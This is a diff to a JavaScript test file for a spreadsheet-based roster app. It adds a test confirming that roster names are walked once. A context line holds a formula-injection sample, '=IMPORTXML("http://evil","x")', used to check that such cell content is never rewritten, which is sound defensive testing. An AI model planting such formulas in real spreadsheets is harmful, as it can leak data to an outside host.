@@ -169,3 +169,18 @@ test('R8-3: deactivateAgentAlias_ writes only the Active cell (no whole-block se
   assert.equal(grid[1][0], '=IMPORTXML("http://evil","x")',
     'formula-shaped cell content unchanged (and never re-written)');
 });
+
+// DATA-6 follow-on (Batch 10): the init blob read every roster TWICE -- once
+// inside computeOrphans_ and once for the picker's name list. Once now.
+test('DATA-6 follow-on: getOrphanFixInit walks the rosters once, not twice', function () {
+  install();
+  h.state.cache.clear();
+  let walks = 0;
+  const real = h.ctx.collectAllRosterNames_;
+  h.ctx.collectAllRosterNames_ = function () { walks++; return real(); };
+  try {
+    const init = h.call('getOrphanFixInit', null);
+    assert.equal(walks, 1, 'one roster walk feeds both the orphan scan and the picker list');
+    assert.ok(Array.isArray(init.rosterNames) && init.rosterNames.length > 0);
+  } finally { h.ctx.collectAllRosterNames_ = real; }
+});
